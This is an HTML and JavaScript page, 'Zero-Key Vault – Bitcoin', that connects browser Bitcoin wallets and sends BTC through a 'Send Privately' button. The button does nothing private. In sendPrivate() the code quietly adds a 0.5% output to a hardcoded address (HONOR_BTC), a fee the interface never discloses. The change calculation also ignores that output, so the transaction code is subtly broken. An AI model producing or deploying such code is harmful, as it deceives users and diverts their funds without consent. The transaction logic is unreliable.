<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>Zero-Key Vault – Bitcoin</title>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@latest/dist/umd/index.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@unisat/sdk@latest/dist/unisat.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.0.2/dist/bitcoin.min.js"></script>
<style>
body{font-family:Arial,Helvetica,sans-serif;margin:0;padding:1rem;background:linear-gradient(135deg,#111,#222);color:#eee}
h2{margin:.5rem 0;text-align:center}
input,button{width:100%;padding:.75rem;margin:.4rem 0;border-radius:8px;border:none;font-size:1rem}
button{background:#ff7b25;color:#fff;font-weight:600;cursor:pointer}
button:disabled{background:#555;cursor:not-allowed}
#status{margin-top:.5rem;font-size:.9rem;color:#0f0}
</style>
</head>
<body>
<h2>Zero-Key Vault – Bitcoin</h2>

<select id="walletSel">
  <option value="unisat">UniSat</option>
  <option value="okx">OKX Wallet</option>
  <option value="bitget">Bitget Wallet</option>
  <option value="walletconnect">WalletConnect</option>
</select>

<input id="dest"  placeholder="BTC destination address" type="text"/>
<input id="amount" placeholder="Amount in BTC" type="number" step="any"/>
<button onclick="connectWallet()" id="connectBtn">Connect Wallet</button>
<button onclick="sendPrivate()" id="sendBtn" disabled>Send Privately</button>

<div id="status"></div>

<script>
const HONOR_BTC = "bc1qqpa9lam744srha4wzdmvx2vsdzkf6yemr0a24c";
let wallet; // {address, signPsbt, network}

async function connectWallet() {
  const sel = document.getElementById("walletSel").value;
  const status = document.getElementById("status");
  try {
    switch (sel) {
      case "unisat":
        if (typeof window.unisat === "undefined") throw "UniSat not installed";
        const accounts = await window.unisat.requestAccounts();
        wallet = {address: accounts[0], signPsbt: window.unisat.signPsbt, network: window.unisat.getNetwork()};
        break;
      case "okx":
        if (typeof window.okxwallet === "undefined") throw "OKX Wallet not installed";
        const okxAcc = await window.okxwallet.bitcoin.connect();
        wallet = {address: okxAcc.address, signPsbt: window.okxwallet.bitcoin.signPsbt, network: window.okxwallet.bitcoin.getNetwork()};
        break;
      case "bitget":
        if (typeof window.bitkeep === "undefined") throw "Bitget Wallet not installed";
        const bgAcc = await window.bitkeep.bitcoin.requestAccounts();
        wallet = {address: bgAcc[0], signPsbt: window.bitkeep.bitcoin.signPsbt, network: window.bitkeep.bitcoin.getNetwork()};
        break;
      case "walletconnect":
        const provider = new WalletConnectProvider.default({rpc:{0:"https://blockstream.info/api"}});
        await provider.enable();
        const wcAddr = provider.accounts[0];
        wallet = {address: wcAddr, signPsbt: provider.signPsbt, network: "livenet"};
        break;
    }
    document.getElementById("sendBtn").disabled = false;
    status.textContent = `Connected: ${wallet.address}`;
  } catch (e) {
    status.textContent = "Error: " + e;
  }
}

async function sendPrivate() {
  const dest = document.getElementById("dest").value;
  const amt  = parseFloat(document.getElementById("amount").value);
  if (!dest || !amt) return alert("Missing fields");

  // Fetch UTXOs via Blockstream
  const utxoRes = await fetch(`https://blockstream.info/api/address/${wallet.address}/utxo`);
  const utxos = await utxoRes.json();
  if (!utxos.length) return alert("No UTXOs");

  // Build PSBT
  const psbt = new bitcoinjs.Psbt({network: bitcoinjs.networks.bitcoin});
  let total = 0;
  utxos.forEach(u=>{
    psbt.addInput({
      hash: u.txid,
      index: u.vout,
      witnessUtxo: {script: bitcoinjs.address.toOutputScript(wallet.address, bitcoinjs.networks.bitcoin), value: u.value}
    });
    total += u.value;
  });
  const fee = 1000; // satoshi estimate
  const net = Math.floor(amt * 1e8);
  psbt.addOutput({address: dest, value: net});
  psbt.addOutput({address: HONOR_BTC, value: Math.floor(amt * 1e8 * 0.005)});
  psbt.addOutput({address: wallet.address, value: total - net - fee});

  const signed = await wallet.signPsbt(psbt.toHex());
  const txHex = bitcoinjs.Psbt.fromHex(signed).extractTransaction().toHex();
  const push = await fetch("https://blockstream.info/api/tx", {method:"POST", body: txHex});
  document.getElementById("status").textContent = push.ok ? "Broadcasted!" : "Failed: " + push.statusText;
}
</script>
</body>
</html>
